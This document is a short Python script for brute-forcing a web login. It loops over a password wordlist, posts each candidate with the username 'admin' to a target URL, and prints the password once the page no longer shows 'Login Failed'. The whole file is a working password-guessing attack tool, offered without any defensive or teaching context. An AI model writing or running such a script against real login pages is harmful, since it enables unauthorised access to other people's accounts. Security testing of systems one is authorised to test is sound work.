#!/usr/bin/env python

import requests

target_url = "https://sample.com" 
data_dict = {"username":"admin", "password":"","login":"submit"}

with open("password.list","r") as word_list:
    for line in word_list:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if response.status_code == 200:
            if 'Login Failed' not in response.content.decode():
                print("[+] Got the password -->" + word)
                exit()

print("[+] Reached end of line")
